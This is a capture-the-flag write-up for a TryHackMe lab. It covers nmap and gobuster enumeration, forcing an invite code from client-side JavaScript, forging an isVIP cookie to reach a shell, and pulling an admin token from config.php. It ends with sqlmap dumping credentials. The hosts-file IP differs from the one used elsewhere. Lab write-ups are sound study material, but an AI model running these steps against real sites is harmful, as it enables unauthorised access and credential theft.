### TryHackMe Room: Incident Storyline


#### Objectives

- Find the invite code for the hackme.thm website.
- Obtain the password for the user `guest@hackme.thm`.
- Retrieve the secure token for accessing the admin panel.
- Identify the flag value after enabling the registration feature and achieving 3 million subscribers.

### Lab Connection

I connected to the lab by starting the machine, which took about 3-5 minutes to load. I used the IP address `10.10.12.34` for accessing the services.

### Initial Enumeration

#### Nmap Scan

I started with a quick Nmap scan to identify open ports and services on the target:

```sh
nmap -sV 10.10.12.34
```

```plaintext
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-03 20:42 BST
Nmap scan report for 10.10.12.34
Host is up (0.042s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
8000/tcp open  http     Splunkd httpd
8089/tcp open  ssl/http Splunkd httpd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Server Enumeration

#### Browsing the Website

Browsing the IP `10.10.12.34` didn't reveal any immediate clues. Therefore, I used Gobuster to brute-force directories and files.

```sh
gobuster dir -u http://10.10.12.34 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

```plaintext
/img (Status: 301)
/css (Status: 301)
/js (Status: 301)
/javascript (Status: 301)
/phpmyadmin (Status: 301)
/server-status (Status: 403)
```

#### Inspecting the Website

Inspecting the page `http://capture3millionsubscribers.thm/sign_up.php` provided a clue in the JavaScript code:

```javascript
function e() {
  var e = window.location.hostname;
  if (e === 'capture3millionsubscribers.thm') {
    var o = new XMLHttpRequest;
    o.open('POST', 'inviteCode1337HM.php', true);
    o.onload = function () {
      if (this.status == 200) {
        console.log('Invite Code:', this.responseText)
      } else {
        console.error('Error fetching invite code.')
      }
    };
    o.send()
  } else if (e === 'hackme.thm') {
    console.log('This function does not operate on hackme.thm')
  } else {
    console.log('Lol!! Are you smart enought to get the invite code?')
  }
}
```

I added the following entries to `/etc/hosts` to resolve the domains:

```plaintext
10.10.45.229    hackme.thm capture3millionsubscribers.thm
```

### Exploitation Steps

#### Modifying the Form Action

I modified the form action to obtain the invite code:

```html
<form action="inviteCode1337HM.php" method="post">
  <div class="form-group">
    <label>Registration is currently disabled! Invite-only access. <br> <span style="color: red;"></span></label>
  </div>
  <div class="form-group">
    <label>Invite Code</label>
    <input type="password" class="form-control" name="password" placeholder="Invite Code" required="">
  </div>
  <button type="submit" class="btn btn-hgreen">Enter Invite Code</button>
</form>
```

#### Accessing the VIP Module

I used the browser developer tools to modify the cookie and access the VIP section:

1. Change the cookie value to `isVIP=true`.
2. Edit the HTML input field to:

    ```html
    <input type="hidden" id="isVIP" value="true">
    ```

This action unlocked the VIP section, revealing a shell.

#### Extracting Credentials

Once inside, listing the files revealed `config.php`:

```sh
ls
```

The `config.php` contained the admin token and URL. The URL was protected, so I used Gobuster to find the login page:

```sh
gobuster dir -u http://admin1337special.hackme.thm:40009/public/html/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

```plaintext
/public/html/login (Status: 200)
```

### SQL Injection Attack

Using sqlmap, I performed an SQL injection to extract credentials:

```sh
sqlmap -r req2.txt --batch --dump
```

This revealed the admin credentials, allowing me to access the admin panel and restore the registration functionality.
